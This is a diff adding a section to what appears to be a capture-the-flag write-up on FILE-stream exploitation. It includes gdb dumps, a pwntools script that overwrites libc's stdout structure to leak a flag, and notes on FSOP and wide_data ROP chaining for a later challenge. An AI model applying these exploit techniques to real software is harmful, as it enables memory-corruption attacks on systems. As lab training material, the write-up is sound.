@@ -623,6 +623,99 @@ Notice that the program does interacts with the `stdout` file stream, hence we'd
 
 This is actually pretty funny. Because we have write primitive yet no read primitive, we can use our `fp` to overwrite the `stdout` file stream, as it is part of libc (which is given). Once we overwrite `stdout`, we can easily adapt it for a generic read primitive. 
 
+Upon calling `printf`, I've successfully faked libc `stdout` stream:
+
+```bash
+(gdb) x/50gx 0x7f8f57e516a0                                                                                   
+0x7f8f57e516a0 <_IO_2_1_stdout_>:       0x0000000000000800      0x0000000000000000
+0x7f8f57e516b0 <_IO_2_1_stdout_+16>:    0x0000000000405100      0x0000000000000000
+0x7f8f57e516c0 <_IO_2_1_stdout_+32>:    0x0000000000405100      0x0000000000405200
+0x7f8f57e516d0 <_IO_2_1_stdout_+48>:    0x0000000000000000      0x0000000000000000
+0x7f8f57e516e0 <_IO_2_1_stdout_+64>:    0x0000000000000000      0x0000000000000000
+0x7f8f57e516f0 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
+0x7f8f57e51700 <_IO_2_1_stdout_+96>:    0x0000000000000000   0x0000000000000000
+0x7f8f57e51710 <_IO_2_1_stdout_+112>:   0x0000000000000001
+```
+
+However, during `printf` execution, it actually nullifies some parts of the `stdout` file stream! (rest bytes of the stream, after qword `1` aren't affected)
+
+```bash
+(gdb) x/50gx 0x7f8f57e516a0                               
+0x7f8f57e516a0 <_IO_2_1_stdout_>:       0x0000000000000800      0x0000000000000000
+0x7f8f57e516b0 <_IO_2_1_stdout_+16>:    0x0000000000000000      0x0000000000000000
+0x7f8f57e516c0 <_IO_2_1_stdout_+32>:    0x0000000000000000      0x0000000000000000
+0x7f8f57e516d0 <_IO_2_1_stdout_+48>:    0x0000000000000000      0x0000000000000000
+0x7f8f57e516e0 <_IO_2_1_stdout_+64>:    0x0000000000000000      0x0000000000000000
+0x7f8f57e516f0 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
+0x7f8f57e51700 <_IO_2_1_stdout_+96>:    0x0000000000000000      0x0000000000000000
+0x7f8f57e51710 <_IO_2_1_stdout_+112>:   0x0000000000000001
+```
+
+I've set HW breakpoint on the first adjusted pointer:
+
+```bash
+Old value = 4215040
+New value = 0
+0x00007f5ca496897b in _IO_do_write () from target:/lib/x86_64-linux-gnu/libc.so.6
+(gdb) bt
+#0  0x00007f5ca496897b in _IO_do_write () from target:/lib/x86_64-linux-gnu/libc.so.6
+#1  0x00007f5ca49676b5 in _IO_file_xsputn () from target:/lib/x86_64-linux-gnu/libc.so.6
+#2  0x00007f5ca494e972 in ?? () from target:/lib/x86_64-linux-gnu/libc.so.6
+#3  0x00007f5ca4939d3f in printf () from target:/lib/x86_64-linux-gnu/libc.so.6
+```
+
+After some deeper debugging, I've found out that the problem was still having `recvuntil` call within `read_file` handler, which redacted the input. Added `to_recv` optional parameter to deal with this.. \
+So to sum up:
+
+```python
+def read_file(p, index, buf, to_recv=True):
+    p.sendline(b'read_file')
+    p.recvuntil(b'(0-10)\n')
+    p.sendline(str(index).encode())
+    p.recvuntil(b');')
+    p.send(buf)
+    if to_recv:
+        p.recvuntil(b'quit):\n')
+    return
+
+def exploit():    
+    p = process(BINARY)
+    flag_addr = get_flag_addr(p)
+    puts_addr = get_leak_addr(p)
+    libc_base = puts_addr - libc.symbols['puts']
+    stdout_addr = libc_base + libc.symbols['stdout']
+    io_stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_']
+    assert(libc_base & 0xfff == 0)
+    print(f'flag_addr: {hex(flag_addr)} libc_base: {hex(libc_base)} io_stdout_addr: {hex(io_stdout_addr)} stdout_addr: {hex(stdout_addr)}')
+
+    note_size = 115
+    note_index, note_addr = new_note(p, 0, note_size)
+    print(f'note_index: {note_index} note_addr: {hex(note_addr)}')
+
+    fp_addr = open_file(p)
+    print(f'fp_addr: {hex(fp_addr)}')
+
+    intermediate_buf_size = note_size + 1  # Must be absolutely larger. Otherwise, no buffering write would occur
+    fp = FileStructure()
+    fp_bytes = fp.read(io_stdout_addr, intermediate_buf_size)  # We'd use the write primitive to overwrite stdout stream
+    write_fp(p, fp_bytes)
+
+    stdout_fp = FileStructure()
+    stdout_fp_bytes = stdout_fp.write(flag_addr, 0x100)
+    read_file(p, 0, stdout_fp_bytes, to_recv=False)
+
+    print(f'stdout_fp: {stdout_fp}')
+    p.interactive()
+```
+
+## Challenge 17
+
+Now we don't have `libc` leak. We do have `fwrite` option, hence stream read primitive.
+Moreover, finally there are no `win` or `auth` methods, the binary is FULL RELRO, canary, NX and PIE. 
+
+We can redirect code flow by exploiting the `wide_data`. Since we can open multiple streams, we can do so multiple times, chaining ROP gadgets for each iteration. \
+Moreover, we can also use FSOP - chain multiple streams, where each would execute a single gadget, then call `close_file` on all of them. 
+
 
 
 
